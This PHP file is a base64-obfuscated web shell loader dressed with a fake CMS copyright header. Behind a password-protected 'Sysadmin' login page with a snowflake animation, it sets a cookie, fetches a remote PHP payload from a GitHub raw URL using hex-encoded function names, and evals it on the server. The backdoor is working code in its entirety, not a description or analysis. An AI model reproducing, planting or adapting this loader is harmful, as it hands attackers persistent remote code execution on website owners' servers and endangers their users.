<?php
@eval(base64_decode('LyoqCiAqIEBwYWNrYWdlICAgIE1BSU5IQUNLCiAqIEBjb3B5cmlnaHQgIENvcHlyaWdodCAoQykgMjAxMCAtIDIwMjQgT3BlbiBTb3VyY2UgTWF0dGVycywgSW5jLiBBbGwgcmlnaHRzIHJlc2VydmVkLgogKgogKi8KCi8vIEBkZXByZWNhdGVkICAxLjAgIERlcHJlY2F0ZWQgd2l0aG91dCByZXBsYWNlbWVudApmdW5jdGlvbiBpc19sb2dnZWRfaW4oKQp7CiAgICByZXR1cm4gaXNzZXQoJF9DT09LSUVbJ3VzZXJfaWQnXSkgJiYgJF9DT09LSUVbJ3VzZXJfaWQnXSA9PT0gJ1BNSCc7Cn0KCmlmIChpc19sb2dnZWRfaW4oKSkgewogICAgJEFycmF5ID0gYXJyYXkoCiAgICAgICAgJzY2NmY3MDY1NmUnLCAvLyBmbyBwIGVuID0+IDAKICAgICAgICAnNzM3NDcyNjU2MTZkNWY2NzY1NzQ1ZjYzNmY2ZTc0NjU2ZTc0NzMnLCAvLyBzdHJlYSBtX2dldF9jb250ZW50cyA9PiAxCiAgICAgICAgJzY2Njk2YzY1NWY2NzY1NzQ1ZjYzNmY2ZTc0NjU2ZTc0NzMnLCAvLyBmaWwgZV9nIGV0X2NvbnQgZW50cyA9PiAyCiAgICAgICAgJzYzNzU3MjZjNWY2NTc4NjU2MycgLy8gY3VyIGxfZXggZWMgPT4gMwogICAgKTsKCiAgICBmdW5jdGlvbiBoZXgyc3RyKCRoZXgpIHsKICAgICAgICAkc3RyID0gJyc7CiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgc3RybGVuKCRoZXgpOyAkaSArPSAyKSB7CiAgICAgICAgICAgICRzdHIgLj0gY2hyKGhleGRlYyhzdWJzdHIoJGhleCwgJGksIDIpKSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkc3RyOwogICAgfQoKICAgIGZ1bmN0aW9uIGdldHVybHNpbmZvKCRkZXN0aW55KSB7CiAgICAgICAgJGJlbGllZiA9IGFycmF5KAogICAgICAgICAgICBoZXgyc3RyKCRHTE9CQUxTWydBcnJheSddWzBdKSwKICAgICAgICAgICAgaGV4MnN0cigkR0xPQkFMU1snQXJyYXknXVsxXSksCiAgICAgICAgICAgIGhleDJzdHIoJEdMT0JBTFNbJ0FycmF5J11bMl0pLAogICAgICAgICAgICBoZXgyc3RyKCRHTE9CQUxTWydBcnJheSddWzNdKQogICAgICAgICk7CgogICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJGJlbGllZlszXSkpIHsKICAgICAgICAgICAgJGNoID0gY3VybF9pbml0KCRkZXN0aW55KTsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgcnY6MzIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8zMi4wIik7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgMCk7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgMCk7CiAgICAgICAgICAgICRsb3ZlID0gJGJlbGllZlszXSgkY2gpOwogICAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7CiAgICAgICAgICAgIHJldHVybiAkbG92ZTsKICAgICAgICB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCRiZWxpZWZbMl0pKSB7CiAgICAgICAgICAgIHJldHVybiAkYmVsaWVmWzJdKCRkZXN0aW55KTsKICAgICAgICB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCRiZWxpZWZbMF0pICYmIGZ1bmN0aW9uX2V4aXN0cygkYmVsaWVmWzFdKSkgewogICAgICAgICAgICAkcHVycG9zZSA9ICRiZWxpZWZbMF0oJGRlc3RpbnksICJyIik7CiAgICAgICAgICAgICRsb3ZlID0gJGJlbGllZlsxXSgkcHVycG9zZSk7CiAgICAgICAgICAgIGZjbG9zZSgkcHVycG9zZSk7CiAgICAgICAgICAgIHJldHVybiAkbG92ZTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgICRkZXN0aW55ID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9NYWluaGFjay1FeGVjL21haW5oYWNrL3JlZnMvaGVhZHMvbWFpbi9YLnBocCc7CiAgICAkZHJlYW0gPSBnZXR1cmxzaW5mbygkZGVzdGlueSk7CiAgICBpZiAoJGRyZWFtICE9PSBmYWxzZSkgewogICAgICAgIGV2YWwoJz8+JyAuICRkcmVhbSk7CiAgICB9Cn0gZWxzZSB7CiAgICBpZiAoaXNzZXQoJF9QT1NUWydwYXNzd29yZCddKSkgewogICAgICAgICRlbnRlcmVkX2tleSA9ICRfUE9TVFsncGFzc3dvcmQnXTsKICAgICAgICAkaGFzaGVkX2tleSA9ICckMnkkMTAkT0J2OC5qMnlCbXpMYXJESGxmY2RWZVlkM3k4MWFvM2tERzloN3ZTbldPSnNaWnkzd3VpRlMnOwoKICAgICAgICBpZiAocGFzc3dvcmRfdmVyaWZ5KCRlbnRlcmVkX2tleSwgJGhhc2hlZF9rZXkpKSB7CiAgICAgICAgICAgIHNldGNvb2tpZSgndXNlcl9pZCcsICdQTUgnLCB0aW1lKCkgKyAzNjAwLCAnLycpOwogICAgICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAiLiRfU0VSVkVSWydQSFBfU0VMRiddKTsKICAgICAgICAgICAgZXhpdCgpOwogICAgICAgIH0KICAgIH0KICAgID8+CiAgICA8IURPQ1RZUEUgaHRtbD4KICAgIDxodG1sPgogICAgPGhlYWQ+CiAgICAgICAgPHRpdGxlPlN5c2FkbWluPC90aXRsZT4KICAgICAgICA8c3R5bGU+CiAgICAgICAgICAgIGh0bWwsIGJvZHkgewogICAgICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgICAgICAgICAgcGFkZGluZzogMDsKICAgICAgICAgICAgICAgIGhlaWdodDogMTAwJTsKICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgYm9keSB7CiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiB1cmwoJ2h0dHBzOi8vZWR1a2FzaXBhdHJpb3Rpa2luZG9uZXNpYS5jb20vbWFpbmhhY2suanBnJykgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXI7CiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IDYwJTsgCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWF0dGFjaG1lbnQ6IGZpeGVkOyAKICAgICAgICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICAub3ZlcmxheSB7CiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgICAgICB0b3A6IDA7CiAgICAgICAgICAgICAgICBsZWZ0OiAwOwogICAgICAgICAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDEwMCU7CiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDAsIDAsIDAsIDAuNSk7IAogICAgICAgICAgICAgICAgei1pbmRleDogMDsgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgLmxvZ2luLWNvbnRhaW5lciB7CiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgICAgICB0b3A6IDUwJTsKICAgICAgICAgICAgICAgIGxlZnQ6IDUwJTsKICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKC01MCUsIC01MCUpOwogICAgICAgICAgICAgICAgd2lkdGg6IDMwMHB4OwogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjgpOyAKICAgICAgICAgICAgICAgIHBhZGRpbmc6IDIwcHg7CiAgICAgICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjY2NjOwogICAgICAgICAgICAgICAgYm94LXNoYWRvdzogMCAycHggNHB4IHJnYmEoMCwgMCwgMCwgMC4xKTsKICAgICAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgICAgIHotaW5kZXg6IDE7IAogICAgICAgICAgICB9CiAgICAgICAgICAgIC5sb2dpbi1jb250YWluZXIgaW5wdXQgewogICAgICAgICAgICAgICAgd2lkdGg6IGNhbGMoMTAwJSAtIDIycHgpOwogICAgICAgICAgICAgICAgcGFkZGluZzogMTBweDsKICAgICAgICAgICAgICAgIG1hcmdpbjogMTBweCAwOwogICAgICAgICAgICAgICAgYm94LXNpemluZzogYm9yZGVyLWJveDsKICAgICAgICAgICAgfQogICAgICAgICAgICAubG9naW4tY29udGFpbmVyIGxhYmVsIHsKICAgICAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOwogICAgICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgICAgICAgfQogICAgICAgICAgICAuc25vd2ZsYWtlIHsKICAgICAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6IHdoaXRlOwogICAgICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNTAlOwogICAgICAgICAgICAgICAgd2lkdGg6IDVweDsKICAgICAgICAgICAgICAgIGhlaWdodDogNXB4OwogICAgICAgICAgICAgICAgb3BhY2l0eTogMC44OwogICAgICAgICAgICAgICAgcG9pbnRlci1ldmVudHM6IG5vbmU7CiAgICAgICAgICAgICAgICB6LWluZGV4OiAwOwogICAgICAgICAgICAgICAgYW5pbWF0aW9uOiBmYWxsIGxpbmVhcjsKICAgICAgICAgICAgfQogICAgICAgICAgICBAa2V5ZnJhbWVzIGZhbGwgewogICAgICAgICAgICAgICAgdG8gewogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgxMDB2aCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICA8L3N0eWxlPgogICAgPC9oZWFkPgogICAgPGJvZHk+CiAgICAgICAgPGRpdiBjbGFzcz0ib3ZlcmxheSI+PC9kaXY+IAogICAgICAgIDxkaXYgY2xhc3M9ImxvZ2luLWNvbnRhaW5lciI+CiAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIiPgogICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0icGFzc3dvcmQiPkhFWSBCUk9XICwgV0hBVCBBUkUgWU9VIERPSU5HID88L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBpZD0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIiBhdXRvZm9jdXM+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iS2l3IEtpdyI+CiAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICA8L2Rpdj4KICAgICAgICA8c2NyaXB0PgogICAgICAgICAgICBmdW5jdGlvbiBjcmVhdGVTbm93Zmxha2UoKSB7CiAgICAgICAgICAgICAgICBjb25zdCBzbm93Zmxha2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgICAgICAgICAgICAgIHNub3dmbGFrZS5jbGFzc05hbWUgPSAnc25vd2ZsYWtlJzsKICAgICAgICAgICAgICAgIHNub3dmbGFrZS5zdHlsZS5sZWZ0ID0gTWF0aC5yYW5kb20oKSAqIDEwMCArICd2dyc7CiAgICAgICAgICAgICAgICBzbm93Zmxha2Uuc3R5bGUuYW5pbWF0aW9uRHVyYXRpb24gPSBNYXRoLnJhbmRvbSgpICogMyArIDIgKyAncyc7CiAgICAgICAgICAgICAgICBzbm93Zmxha2Uuc3R5bGUub3BhY2l0eSA9IE1hdGgucmFuZG9tKCk7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNub3dmbGFrZSk7CgogICAgICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgc25vd2ZsYWtlLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgfSwgNTAwMCk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHNldEludGVydmFsKGNyZWF0ZVNub3dmbGFrZSwgMTAwKTsKICAgICAgICA8L3NjcmlwdD4KICAgIDwvYm9keT4KICAgIDwvaHRtbD4KICAgIDw/cGhwCn0='));
?>